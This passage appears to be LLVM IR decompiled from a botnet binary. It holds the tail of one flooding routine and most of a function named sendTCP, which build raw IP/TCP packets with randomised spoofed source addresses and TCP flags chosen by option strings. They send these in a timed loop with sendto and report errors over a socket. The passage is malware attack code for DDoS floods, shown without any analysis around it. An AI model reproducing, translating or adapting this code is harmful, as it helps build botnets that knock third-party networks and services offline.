  %v1_f8d0 = trunc i32 %v0_f8d0 to i8
  %v2_f8d0 = load i32, i32* %r2.global-to-local, align 4
  %v3_f8d0 = add i32 %v2_f8d0, 7
  %v4_f8d0 = inttoptr i32 %v3_f8d0 to i8*
  store i8 %v1_f8d0, i8* %v4_f8d0, align 1
  %v1_f8d8 = add i32 %v3_f7b8, 28
  store i32 %v1_f8d8, i32* %r3.global-to-local, align 4
  %v3_f8e0 = load i32, i32* %stack_var_0, align 4
  %v2_f8e4 = call i32 @makeRandomStr(i32 %v1_f8d8, i32 %v3_f8e0)
  %v1_f8f4 = or i32 %v3_f7b8, 2
  store i32 %v1_f8f4, i32* %r3.global-to-local, align 4
  %v1_f8f8 = inttoptr i32 %v1_f8f4 to i8*
  %v2_f8f8 = load i8, i8* %v1_f8f8, align 2
  %v3_f8f8 = zext i8 %v2_f8f8 to i32
  store i32 %v3_f8f8, i32* %r2.global-to-local, align 4
  %v1_f8fc = or i32 %v1_f7b4, 3
  %v2_f8fc = inttoptr i32 %v1_f8fc to i8*
  %v3_f8fc = load i8, i8* %v2_f8fc, align 1
  %v4_f8fc = zext i8 %v3_f8fc to i32
  %v4_f900 = mul nuw nsw i32 %v4_f8fc, 256
  %v5_f900 = or i32 %v4_f900, %v3_f8f8
  store i32 %v5_f900, i32* %r3.global-to-local, align 4
  %v3_f90c = call i32 @csum(i8* %v4_f814, i32 %v5_f900)
  %sext6 = mul i32 %v3_f90c, 16777216
  %v1_f910 = sdiv i32 %sext6, 16777216
  store i32 %v1_f910, i32* %r3.global-to-local, align 4
  store i32 %v3_f7b8, i32* %r2.global-to-local, align 4
  %v1_f918 = trunc i32 %v1_f910 to i8
  %v3_f918 = add i32 %v3_f7b8, 10
  %v4_f918 = inttoptr i32 %v3_f918 to i8*
  store i8 %v1_f918, i8* %v4_f918, align 2
  %v0_f91c = load i32, i32* %r3.global-to-local, align 4
  %v3_f91c = sdiv i32 %v0_f91c, 256
  store i32 %v3_f91c, i32* %r3.global-to-local, align 4
  %v1_f920 = trunc i32 %v3_f91c to i8
  %v2_f920 = load i32, i32* %r2.global-to-local, align 4
  %v3_f920 = add i32 %v2_f920, 11
  %v4_f920 = inttoptr i32 %v3_f920 to i8*
  store i8 %v1_f920, i8* %v4_f920, align 1
  %v2_f928 = call i32 @__GI_time(i32* null)
  %v2_f934 = add i32 %v2_f928, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_fa04 = add i32 %v3_f7b8, 4
  %v4_fa04 = inttoptr i32 %v3_fa04 to i8*
  %v2_fa2c = add i32 %v3_f7b8, 12
  %v3_fa2c = inttoptr i32 %v2_fa2c to i32*
  %v3_fac4 = mul i32 %arg8, 4
  %v3_fad4 = mul i32 %arg8, 1000
  br label %dec_label_pc_f950.outer

dec_label_pc_f950.outer:                          ; preds = %dec_label_pc_faec, %dec_label_pc_fabc, %dec_label_pc_f8ac
  %stack_var_-104.0.ph = phi i32 [ 0, %dec_label_pc_f8ac ], [ %v1_faa4, %dec_label_pc_fabc ], [ %v1_faa4, %dec_label_pc_faec ]
  %stack_var_-100.0.ph = phi i32 [ 0, %dec_label_pc_f8ac ], [ 0, %dec_label_pc_fabc ], [ %v1_faf0, %dec_label_pc_faec ]
  br label %dec_label_pc_f950

dec_label_pc_f950:                                ; preds = %dec_label_pc_f950.outer, %dec_label_pc_fa94
  %stack_var_-104.0 = phi i32 [ 0, %dec_label_pc_fa94 ], [ %stack_var_-104.0.ph, %dec_label_pc_f950.outer ]
  store i32 %v3_f7b8, i32* %r2.global-to-local, align 4
  %v1_f958 = load i32, i32* @sp, align 4
  %v2_f958 = inttoptr i32 %v1_f958 to i32*
  store i32 %v2_f4ac, i32* %v2_f958, align 4
  %v1_f960 = load i32, i32* @sp, align 4
  %v2_f960 = add i32 %v1_f960, 4
  %v3_f960 = inttoptr i32 %v2_f960 to i32*
  store i32 16, i32* %v3_f960, align 4
  %v0_f968 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_f788, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_f974 = inttoptr i32 %v0_f968 to i32*
  %v7_f974 = call i32 @__libc_sendto(i32 %v0_f680, i32* %v6_f974, i32 %v1_f788, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_f978 = call i32 @rand_cmwc()
  %v3_f984 = urem i32 %v0_f978, 65536
  store i32 %v3_f984, i32* %r3.global-to-local, align 4
  store i32 %v1_f7d8, i32* %r2.global-to-local, align 4
  %v1_f98c = trunc i32 %v0_f978 to i8
  store i8 %v1_f98c, i8* %v5_f7dc, align 4
  %v0_f990 = load i32, i32* %r3.global-to-local, align 4
  %v3_f99041 = udiv i32 %v0_f990, 256
  %v1_f994 = trunc i32 %v3_f99041 to i8
  %v2_f994 = load i32, i32* %r2.global-to-local, align 4
  %v3_f994 = add i32 %v2_f994, 1
  %v4_f994 = inttoptr i32 %v3_f994 to i8*
  store i8 %v1_f994, i8* %v4_f994, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_f440, label %dec_label_pc_f9a4, label %dec_label_pc_f9bc

dec_label_pc_f9a4:                                ; preds = %dec_label_pc_f950
  %v0_f9a4 = call i32 @rand_cmwc()
  %v3_f9ac = mul i32 %v0_f9a4, 65536
  store i32 %v3_f9ac, i32* %r3.global-to-local, align 4
  %extract.t103 = trunc i32 %v0_f9a4 to i8
  br label %dec_label_pc_f9d8

dec_label_pc_f9bc:                                ; preds = %dec_label_pc_f950
  store i32 %v3_f9c4.pre-phi, i32* %r3.global-to-local, align 4
  %v1_f9cc = call i32 @htons(i32 %v3_f9c4.pre-phi)
  %extract.t104 = trunc i32 %v1_f9cc to i8
  br label %dec_label_pc_f9d8

dec_label_pc_f9d8:                                ; preds = %dec_label_pc_f9a4, %dec_label_pc_f9bc
  %v0_f9a4.sink.off0 = phi i8 [ %extract.t103, %dec_label_pc_f9a4 ], [ %extract.t104, %dec_label_pc_f9bc ]
  store i32 %v1_f7d8, i32* %r2.global-to-local, align 4
  %v4_f9dc = sext i8 %v0_f9a4.sink.off0 to i32
  store i8 %v0_f9a4.sink.off0, i8* %v4_f8b4, align 2
  %v3_f9e8 = sdiv i32 %v4_f9dc, 256
  store i32 %v3_f9e8, i32* %r3.global-to-local, align 4
  %v1_f9ec = trunc i32 %v3_f9e8 to i8
  %v2_f9ec = load i32, i32* %r2.global-to-local, align 4
  %v3_f9ec = add i32 %v2_f9ec, 3
  %v4_f9ec = inttoptr i32 %v3_f9ec to i8*
  store i8 %v1_f9ec, i8* %v4_f9ec, align 1
  %v0_f9f0 = call i32 @rand_cmwc()
  %v3_f9fc = urem i32 %v0_f9f0, 65536
  store i32 %v3_f9fc, i32* %r3.global-to-local, align 4
  store i32 %v3_f7b8, i32* %r2.global-to-local, align 4
  %v1_fa04 = trunc i32 %v0_f9f0 to i8
  store i8 %v1_fa04, i8* %v4_fa04, align 4
  %v0_fa08 = load i32, i32* %r3.global-to-local, align 4
  %v3_fa08 = sdiv i32 %v0_fa08, 256
  store i32 %v3_fa08, i32* %r3.global-to-local, align 4
  %v1_fa0c = trunc i32 %v3_fa08 to i8
  %v2_fa0c = load i32, i32* %r2.global-to-local, align 4
  %v3_fa0c = add i32 %v2_fa0c, 5
  %v4_fa0c = inttoptr i32 %v3_fa0c to i8*
  store i8 %v1_fa0c, i8* %v4_fa0c, align 1
  %v1_fa14 = call i32 @GetRandomIP(i32 %storemerge12)
  store i32 %v1_fa14, i32* %r3.global-to-local, align 4
  %v1_fa20 = call i32 @htonl(i32 %v1_fa14)
  store i32 %v1_fa20, i32* %r2.global-to-local, align 4
  store i32 %v1_fa20, i32* %v3_fa2c, align 4
  store i32 %v1_f8f4, i32* %r3.global-to-local, align 4
  %v2_fa40 = load i8, i8* %v1_f8f8, align 2
  %v3_fa40 = zext i8 %v2_fa40 to i32
  store i32 %v3_fa40, i32* %r2.global-to-local, align 4
  %v3_fa44 = load i8, i8* %v2_f8fc, align 1
  %v4_fa44 = zext i8 %v3_fa44 to i32
  %v4_fa48 = mul nuw nsw i32 %v4_fa44, 256
  %v5_fa48 = or i32 %v4_fa48, %v3_fa40
  store i32 %v5_fa48, i32* %r3.global-to-local, align 4
  %v3_fa54 = call i32 @csum(i8* %v4_f814, i32 %v5_fa48)
  %sext7 = mul i32 %v3_fa54, 16777216
  %v1_fa58 = sdiv i32 %sext7, 16777216
  store i32 %v1_fa58, i32* %r3.global-to-local, align 4
  store i32 %v3_f7b8, i32* %r2.global-to-local, align 4
  %v1_fa60 = trunc i32 %v1_fa58 to i8
  store i8 %v1_fa60, i8* %v4_f918, align 2
  %v0_fa64 = load i32, i32* %r3.global-to-local, align 4
  %v3_fa6445 = udiv i32 %v0_fa64, 256
  %v1_fa68 = trunc i32 %v3_fa6445 to i8
  %v2_fa68 = load i32, i32* %r2.global-to-local, align 4
  %v3_fa68 = add i32 %v2_fa68, 11
  %v4_fa68 = inttoptr i32 %v3_fa68 to i8*
  store i8 %v1_fa68, i8* %v4_fa68, align 1
  store i32 %stack_var_-104.0, i32* %r2.global-to-local, align 4
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v9_fa74 = icmp eq i32 %stack_var_-104.0, %arg6
  br i1 %v9_fa74, label %dec_label_pc_fa7c, label %dec_label_pc_faa0

dec_label_pc_fa7c:                                ; preds = %dec_label_pc_f9d8
  %v2_fa80 = call i32 @__GI_time(i32* null)
  store i32 %v2_fa80, i32* %r2.global-to-local, align 4
  store i32 %v2_f934, i32* %r3.global-to-local, align 4
  %v8_fa90 = icmp sgt i32 %v2_fa80, %v2_f934
  br i1 %v8_fa90, label %dec_label_pc_fafc, label %dec_label_pc_fa94

dec_label_pc_fa94:                                ; preds = %dec_label_pc_fa7c
  br label %dec_label_pc_f950

dec_label_pc_faa0:                                ; preds = %dec_label_pc_f9d8
  %v1_faa4 = add i32 %stack_var_-104.0, 1
  store i32 %v1_faa4, i32* %r2.global-to-local, align 4
  store i32 %arg7, i32* %r3.global-to-local, align 4
  %v9_fab4 = icmp eq i32 %stack_var_-100.0.ph, %arg7
  br i1 %v9_fab4, label %dec_label_pc_fabc, label %dec_label_pc_faec

dec_label_pc_fabc:                                ; preds = %dec_label_pc_faa0
  store i32 %v3_fac4, i32* %r2.global-to-local, align 4
  store i32 %v3_fad4, i32* %r3.global-to-local, align 4
  %v1_fadc = call i32 @usleep(i32 %v3_fad4)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f950.outer

dec_label_pc_faec:                                ; preds = %dec_label_pc_faa0
  %v1_faf0 = add i32 %stack_var_-100.0.ph, 1
  store i32 %v1_faf0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f950.outer

dec_label_pc_fafc:                                ; preds = %dec_label_pc_fa7c, %dec_label_pc_f6e4, %dec_label_pc_f698
  %v12_fb0433 = phi i32 [ %v3_f6f4, %dec_label_pc_f6e4 ], [ %v3_f6a8, %dec_label_pc_f698 ], [ %v2_fa80, %dec_label_pc_fa7c ]
  br label %dec_label_pc_fb00

dec_label_pc_fb00:                                ; preds = %dec_label_pc_f5ec, %dec_label_pc_f48c, %dec_label_pc_f514, %dec_label_pc_f4fc, %dec_label_pc_fafc
  %v12_fb04 = phi i32 [ %v3_f49c, %dec_label_pc_f48c ], [ 0, %dec_label_pc_f514 ], [ %v3_f50c, %dec_label_pc_f4fc ], [ %v12_fb0433, %dec_label_pc_fafc ], [ %v2_f5f0, %dec_label_pc_f5ec ]
  store i32 %v3_f410, i32* @r4, align 4
  store i32 %v6_f410, i32* @fp, align 4
  ret i32 %v12_fb04

; uselistorder directives
  uselistorder i32 %v1_faf0, { 1, 0 }
  uselistorder i32 %v1_faa4, { 2, 1, 0 }
  uselistorder i32 %v1_fa58, { 1, 0 }
  uselistorder i32 %v3_fa08, { 1, 0 }
  uselistorder i32 %v0_f9f0, { 1, 0 }
  uselistorder i32 %v3_f9e8, { 1, 0 }
  uselistorder i8 %v0_f9a4.sink.off0, { 1, 0 }
  uselistorder i32 %v0_f9a4, { 1, 0 }
  uselistorder i32 %v0_f978, { 1, 0 }
  uselistorder i32 %stack_var_-104.0, { 0, 2, 1 }
  uselistorder i32 %v3_fad4, { 1, 0 }
  uselistorder i32 %v2_f934, { 1, 0 }
  uselistorder i32 %v3_f91c, { 1, 0 }
  uselistorder i32 %v1_f910, { 1, 0 }
  uselistorder i32 %v1_f8f4, { 0, 2, 1 }
  uselistorder i32 %v3_f9c4.pre-phi, { 1, 0 }
  uselistorder i8 %v0_f878.sink.off0, { 1, 0 }
  uselistorder i32 %v3_f898, { 2, 1, 0 }
  uselistorder i32 %v0_f878, { 1, 0 }
  uselistorder i32 %v0_f84c, { 1, 0 }
  uselistorder i32 %v3_f844, { 1, 0 }
  uselistorder i32 %v1_f838, { 1, 0 }
  uselistorder i32 %v3_f82c, { 1, 0 }
  uselistorder i32 %v3_f7b8, { 9, 7, 5, 8, 6, 3, 4, 14, 13, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v1_f788, { 1, 0 }
  uselistorder i32 %v1_f740, { 1, 0 }
  uselistorder i32 %v1_f614, { 1, 0 }
  uselistorder i32 %v3_f58c, { 1, 0 }
  uselistorder i32 %stack_var_-108.0.ph, { 1, 2, 0 }
  uselistorder i32 %v3_f644, { 1, 0 }
  uselistorder i32 %v2_f570, { 1, 0 }
  uselistorder i32 %v1_f520, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 %v2_f4ac, { 1, 0, 2 }
  uselistorder i32 %v3_f470, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-80, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 8, 9, 6, 7, 13, 10, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 25, 26, 23, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 36, 39, 41, 40, 42, 43, 47, 44, 45, 46, 74, 48, 50, 49, 51, 52, 53, 55, 54, 56, 58, 57, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 70, 69, 71, 72, 73, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i32 26, { 0, 2, 1 }
  uselistorder i32 (i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg8, { 3, 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 3, 0, 2 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder i32 %arg4, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %arg2, { 2, 0, 3, 4, 1, 6, 5 }
  uselistorder label %dec_label_pc_fb00, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_f9d8, { 1, 0 }
  uselistorder label %dec_label_pc_f950, { 1, 0 }
  uselistorder label %dec_label_pc_f8ac, { 1, 0 }
  uselistorder label %dec_label_pc_f784, { 1, 0 }
  uselistorder label %dec_label_pc_f708, { 1, 0 }
  uselistorder label %dec_label_pc_f5ec, { 1, 0 }
  uselistorder label %dec_label_pc_f58c, { 1, 0 }
  uselistorder label %dec_label_pc_f48c, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_fb18 = load i32, i32* @r4, align 4
  %v6_fb18 = load i32, i32* @fp, align 4
  store i32 64288, i32* %stack_var_-4, align 4
  %v2_fb1c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_fb1c, i32* @fp, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_fb58 = icmp eq i32 %arg2, 0
  br i1 %v2_fb58, label %dec_label_pc_fb60, label %dec_label_pc_fb80

dec_label_pc_fb60:                                ; preds = %entry
  %v0_fb60 = call i32 @rand_cmwc()
  %v3_fb68 = mul i32 %v0_fb60, 65536
  store i32 %v3_fb68, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fba4

dec_label_pc_fb80:                                ; preds = %entry
  %v3_fb88 = urem i32 %arg2, 65536
  store i32 %v3_fb88, i32* %r3.global-to-local, align 4
  %v1_fb90 = call i32 @htons(i32 %v3_fb88)
  br label %dec_label_pc_fba4

dec_label_pc_fba4:                                ; preds = %dec_label_pc_fb60, %dec_label_pc_fb80
  %v2_fba8 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_fba8, i32* %r3.global-to-local, align 4
  %v3_fbb4 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-60)
  store i32 %v3_fbb4, i32* %r3.global-to-local, align 4
  %v2_fbbc = icmp eq i32 %v3_fbb4, 0
  br i1 %v2_fbbc, label %dec_label_pc_fbc8, label %dec_label_pc_101a0

dec_label_pc_fbc8:                                ; preds = %dec_label_pc_fba4
  %v2_fbc8 = ptrtoint i32* %stack_var_-64 to i32
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 6, i32* @r2, align 4
  %v0_fbec = call i32 @socket()
  store i32 %v0_fbec, i32* %r3.global-to-local, align 4
  %v2_fbfc = icmp eq i32 %v0_fbec, 0
  br i1 %v2_fbfc, label %dec_label_pc_fc04, label %dec_label_pc_fc1c

dec_label_pc_fc04:                                ; preds = %dec_label_pc_fbc8
  %v2_fc08 = load i32, i32* @global_var_265cc.54, align 4
  store i32 %v2_fc08, i32* %r3.global-to-local, align 4
  %v3_fc14 = call i32 @sockprintf(i32 %v2_fc08, i32 ptrtoint ([27 x i8]* @global_var_1c020.558 to i32))
  br label %dec_label_pc_101a0

dec_label_pc_fc1c:                                ; preds = %dec_label_pc_fbc8
  store i32 1, i32* %stack_var_-68, align 4
  %v2_fc24 = ptrtoint i32* %stack_var_-68 to i32
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_fc24, i32* %r3.global-to-local, align 4
  %v6_fc40 = call i32 @__GI_setsockopt(i32 %v0_fbec, i32 0, i32 3, i32* nonnull %stack_var_-68, i32 4)
  store i32 %v6_fc40, i32* %r3.global-to-local, align 4
  %v1_fc48 = icmp slt i32 %v6_fc40, 0
  br i1 %v1_fc48, label %dec_label_pc_fc50, label %dec_label_pc_fc68

dec_label_pc_fc50:                                ; preds = %dec_label_pc_fc1c
  %v2_fc54 = load i32, i32* @global_var_265cc.54, align 4
  store i32 %v2_fc54, i32* %r3.global-to-local, align 4
  %v3_fc60 = call i32 @sockprintf(i32 %v2_fc54, i32 ptrtoint ([33 x i8]* @global_var_1c03c.560 to i32))
  br label %dec_label_pc_101a0

dec_label_pc_fc68:                                ; preds = %dec_label_pc_fc1c
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_fc6c = icmp eq i32 %arg4, 0
  br i1 %v2_fc6c, label %dec_label_pc_fc98, label %dec_label_pc_fc80

dec_label_pc_fc80:                                ; preds = %dec_label_pc_fc68
  %v1_fc84 = sub i32 32, %arg4
  store i32 %v1_fc84, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_fc90 = shl i32 -1, %v1_fc84
  br label %dec_label_pc_fc98

dec_label_pc_fc98:                                ; preds = %dec_label_pc_fc68, %dec_label_pc_fc80
  %storemerge10 = phi i32 [ %v1_fc90, %dec_label_pc_fc80 ], [ 0, %dec_label_pc_fc68 ]
  %v1_fc9c = add i32 %arg6, 40
  %v1_fcac = add i32 %arg6, 46
  %v3_fcb0 = and i32 %v1_fcac, -4
  %v1_fcb8 = load i32, i32* @sp, align 4
  %v2_fcb8 = sub i32 %v1_fcb8, %v3_fcb0
  %v1_fcc8 = add i32 %v2_fcb8, 11
  %v3_fccc = and i32 %v1_fcc8, -4
  store i32 %v3_fccc, i32* %r2.global-to-local, align 4
  %v1_fcec = add i32 %v3_fccc, 20
  store i32 %v1_fcec, i32* %r3.global-to-local, align 4
  %v5_fcf0 = inttoptr i32 %v1_fcec to i8*
  %v3_fcf4 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fcf4, i32* @r4, align 4
  %v1_fcfc = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_fcfc, i32* %r3.global-to-local, align 4
  %v1_fd08 = call i32 @htonl(i32 %v1_fcfc)
  store i32 %v1_fd08, i32* %r2.global-to-local, align 4
  %v1_fd14 = add i32 %arg6, 20
  %v1_fd18 = load i32, i32* @sp, align 4
  %v2_fd18 = inttoptr i32 %v1_fd18 to i32*
  store i32 %v1_fd14, i32* %v2_fd18, align 4
  %v0_fd20 = load i32, i32* @r4, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v4_fd28 = inttoptr i32 %v3_fccc to i8*
  %v5_fd28 = call i32 @makeIPPacket(i8* %v4_fd28, i32 %v0_fd20, i32 %v1_fd08, i32 6)
  %v0_fd2c = call i32 @rand_cmwc()
  %v3_fd38 = urem i32 %v0_fd2c, 65536
  store i32 %v3_fd38, i32* %r3.global-to-local, align 4
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  %v1_fd40 = trunc i32 %v0_fd2c to i8
  store i8 %v1_fd40, i8* %v5_fcf0, align 4
  %v0_fd44 = load i32, i32* %r3.global-to-local, align 4
  %v3_fd44 = sdiv i32 %v0_fd44, 256
  store i32 %v3_fd44, i32* %r3.global-to-local, align 4
  %v1_fd48 = trunc i32 %v3_fd44 to i8
  %v2_fd48 = load i32, i32* %r2.global-to-local, align 4
  %v3_fd48 = add i32 %v2_fd48, 1
  %v4_fd48 = inttoptr i32 %v3_fd48 to i8*
  store i8 %v1_fd48, i8* %v4_fd48, align 1
  %v0_fd4c = call i32 @rand_cmwc()
  %v2_fd58 = add i32 %v3_fccc, 24
  %v3_fd58 = inttoptr i32 %v2_fd58 to i32*
  store i32 %v0_fd4c, i32* %v3_fd58, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_fd64 = add i32 %v3_fccc, 28
  %v3_fd64 = inttoptr i32 %v2_fd64 to i32*
  store i32 0, i32* %v3_fd64, align 4
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  %v1_fd6c = add i32 %v3_fccc, 32
  %v2_fd6c = inttoptr i32 %v1_fd6c to i8*
  %v3_fd6c = load i8, i8* %v2_fd6c, align 4
  %v1_fd78 = urem i8 %v3_fd6c, 16
  %v1_fd7c = or i8 %v1_fd78, 80
  store i8 %v1_fd7c, i8* %v2_fd6c, align 4
  %v3_fd8c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_fd8c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c060.565 to i32), i32* @r1, align 4
  %v3_fd98 = inttoptr i32 %v3_fd8c to i8*
  %v4_fd98 = call i32 @__GI_strcoll(i8* %v3_fd98, i32 ptrtoint ([4 x i8]* @global_var_1c060.565 to i32))
  store i32 %v4_fd98, i32* %r3.global-to-local, align 4
  %v2_fda0 = icmp eq i32 %v4_fd98, 0
  br i1 %v2_fda0, label %dec_label_pc_fda8, label %dec_label_pc_fdfc

dec_label_pc_fda8:                                ; preds = %dec_label_pc_fc98
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  %v1_fdac = add i32 %v3_fccc, 33
  %v2_fdac = inttoptr i32 %v1_fdac to i8*
  %v3_fdac = load i8, i8* %v2_fdac, align 1
  %v4_fdac = zext i8 %v3_fdac to i32
  %v1_fdb0 = or i32 %v4_fdac, 2
  store i32 %v1_fdb0, i32* %r3.global-to-local, align 4
  %v1_fdb4 = trunc i32 %v1_fdb0 to i8
  store i8 %v1_fdb4, i8* %v2_fdac, align 1
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  %v3_fdbc = load i8, i8* %v2_fdac, align 1
  %v4_fdbc = zext i8 %v3_fdbc to i32
  %v1_fdc0 = or i32 %v4_fdbc, 4
  store i32 %v1_fdc0, i32* %r3.global-to-local, align 4
  %v1_fdc4 = trunc i32 %v1_fdc0 to i8
  store i8 %v1_fdc4, i8* %v2_fdac, align 1
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  %v3_fdcc = load i8, i8* %v2_fdac, align 1
  %v4_fdcc = zext i8 %v3_fdcc to i32
  %v1_fdd0 = or i32 %v4_fdcc, 1
  store i32 %v1_fdd0, i32* %r3.global-to-local, align 4
  %v1_fdd4 = trunc i32 %v1_fdd0 to i8
  store i8 %v1_fdd4, i8* %v2_fdac, align 1
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  %v3_fddc = load i8, i8* %v2_fdac, align 1
  %v4_fddc = zext i8 %v3_fddc to i32
  %v1_fde0 = or i32 %v4_fddc, 16
  store i32 %v1_fde0, i32* %r3.global-to-local, align 4
  %v1_fde4 = trunc i32 %v1_fde0 to i8
  store i8 %v1_fde4, i8* %v2_fdac, align 1
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  %v3_fdec = load i8, i8* %v2_fdac, align 1
  %v4_fdec = zext i8 %v3_fdec to i32
  %v1_fdf0 = or i32 %v4_fdec, 8
  store i32 %v1_fdf0, i32* %r3.global-to-local, align 4
  %v1_fdf4 = trunc i32 %v1_fdf0 to i8
  store i8 %v1_fdf4, i8* %v2_fdac, align 1
  br label %dec_label_pc_ff40

dec_label_pc_fdfc:                                ; preds = %dec_label_pc_fc98
  %v3_fdfc = load i32, i32* %stack_var_0, align 4
  store i32 %v3_fdfc, i32* %r3.global-to-local, align 4
  store i32 %v3_fdfc, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1c064.567 to i32), i32* @r1, align 4
  %v2_fe08 = call i32 @__GI_strtok(i32 %v3_fdfc, i32 ptrtoint (i32* @global_var_1c064.567 to i32))
  store i32 %v2_fe08, i32* %r3.global-to-local, align 4
  %v2_ff3820 = icmp eq i32 %v2_fe08, 0
  br i1 %v2_ff3820, label %dec_label_pc_ff40, label %dec_label_pc_fe18.lr.ph

dec_label_pc_fe18.lr.ph:                          ; preds = %dec_label_pc_fdfc
  %v1_fe38 = add i32 %v3_fccc, 33
  %v2_fe38 = inttoptr i32 %v1_fe38 to i8*
  br label %dec_label_pc_fe18

dec_label_pc_fe18:                                ; preds = %dec_label_pc_fe18.lr.ph, %dec_label_pc_ff20
  %storemerge1421 = phi i32 [ %v2_fe08, %dec_label_pc_fe18.lr.ph ], [ %v2_ff28, %dec_label_pc_ff20 ]
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c068.569 to i32), i32* @r1, align 4
  %v3_fe24 = inttoptr i32 %storemerge1421 to i8*
  %v4_fe24 = call i32 @__GI_strcoll(i8* %v3_fe24, i32 ptrtoint ([4 x i8]* @global_var_1c068.569 to i32))
  store i32 %v4_fe24, i32* %r3.global-to-local, align 4
  %v2_fe2c = icmp eq i32 %v4_fe24, 0
  br i1 %v2_fe2c, label %dec_label_pc_fe34, label %dec_label_pc_fe48

dec_label_pc_fe34:                                ; preds = %dec_label_pc_fe18
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  %v3_fe38 = load i8, i8* %v2_fe38, align 1
  %v4_fe38 = zext i8 %v3_fe38 to i32
  %v1_fe3c = or i32 %v4_fe38, 2
  store i32 %v1_fe3c, i32* %r3.global-to-local, align 4
  %v1_fe40 = trunc i32 %v1_fe3c to i8
  store i8 %v1_fe40, i8* %v2_fe38, align 1
  br label %dec_label_pc_ff20

dec_label_pc_fe48:                                ; preds = %dec_label_pc_fe18
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c06c.571 to i32), i32* @r1, align 4
  %v4_fe54 = call i32 @__GI_strcoll(i8* %v3_fe24, i32 ptrtoint ([4 x i8]* @global_var_1c06c.571 to i32))
  store i32 %v4_fe54, i32* %r3.global-to-local, align 4
  %v2_fe5c = icmp eq i32 %v4_fe54, 0
  br i1 %v2_fe5c, label %dec_label_pc_fe64, label %dec_label_pc_fe78

dec_label_pc_fe64:                                ; preds = %dec_label_pc_fe48
  store i32 %v1_fcec, i32* %r2.global-to-local, align 4
  %v3_fe68 = load i8, i8* %v2_fe38, align 1
  %v4_fe68 = zext i8 %v3_fe68 to i32
  %v1_fe6c = or i32 %v4_fe68, 4
  store i32 %v1_fe6c, i32* %r3.global-to-local, align 4
  %v1_fe70 = trunc i32 %v1_fe6c to i8
  store i8 %v1_fe70, i8* %v2_fe38, align 1
  br label %dec_label_pc_ff20

dec_label_pc_fe78:                                ; preds = %dec_label_pc_fe48
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1c070.573 to i32), i32* @r1, align 4
